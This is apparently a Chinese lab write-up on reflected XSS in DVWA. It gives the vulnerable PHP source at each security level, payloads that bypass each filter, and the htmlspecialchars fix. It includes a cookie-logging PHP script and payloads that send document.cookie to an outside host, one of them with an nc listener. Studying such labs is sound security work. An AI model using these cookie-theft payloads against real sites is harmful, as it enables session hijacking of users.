---
title: XSS(Reflected)
data: 2026-07-01
draft: false
weight: 12
---

# 一、Low
## 1.1 源码
```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```
- `<pre>`保留文本内部的空格和换行

## 1.2 攻击
```php
<script>alert("xss")</script>
```

构造获取cookie的xss攻击脚本：
```PHP
<?php
// 1. 获取 get 请求中的 cookie
$cookie = $_GET['cookie']; 

if(!empty($cookie)) {
    // 2. 使用 FILE_APPEND 保证多次写入不覆盖，加上 "\n" 强制换行
    file_put_contents('cookie.txt', $cookie . "\n", FILE_APPEND);
    
    // 3. 页面输出一句话，方便我们在浏览器直观确认脚本到底跑没跑
    echo "Cookie successfully captured!";
} else {
    echo "No cookie detected.";
}
?>
```

document.location将页面的内容指定到指定位置。
```PHP
<script>document.location='http://dvwa:81/cookie.php?cookie='+document.cookie;</script>
```


# 二、Medium
## 2.1 源码
```PHP

<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}

?>
```
- 黑名单思维：关键词替换
- 将`$_GET[ 'name' ]`的`<script>`改为空

## 2.2 攻击
```php
<Script>alert(1)</Script>
<scrip<script>t>alert(1)</script>
<img src=1 onerror=alert(1)>
```
- `<img ...>`告诉浏览器，这里加载图片
- `src=1`指定图片路径为1，加载时候会是白
- `onerror=alert(1)`监听到图片加载失败，立刻执行后面的JavaScript代码`

# 三、High
## 3.1 源码
```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}

?>
```
- 黑名单思维
- `preg_replace(patterns, replacements, input, limit, count)`
  语法：`patterns`是要搜索的模式，包含正则表达式，`replacements`是替换的字符串，`input`是输入，`limit`（可选）设置在每个字符串中可以进行的替换次数的限制，`count`（可选）指定后会被填充为完成的次数
- `/`和`/i`位于两侧的`/`是正则的边界符，最后的`i`表示忽略大小写
- `<`必须匹配一个左尖括号
- `(.*)`其中，`.`代表任意字符，`*`代表重复0次或多次
- `<(.*)s`代表，`<`和`s`之间可以夹杂任何字符
- 拦截各种<script形式

## 3.2 攻击
```php
<img src=1 onerror=alert(1)>

<svg onload="new Image().src='http://172.31.171.105:7777/?='+document.cookie">

nc -lvp 7777
```

# 四、Impossible
## 4.1 源码
```PHP
<?php

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $name = htmlspecialchars( $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello {$name}</pre>";
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```
- `htmlspecialchars`函数，将预定义的字符&、"、'、<、>转换为HTML实体，防止浏览器将其作为HTML元素。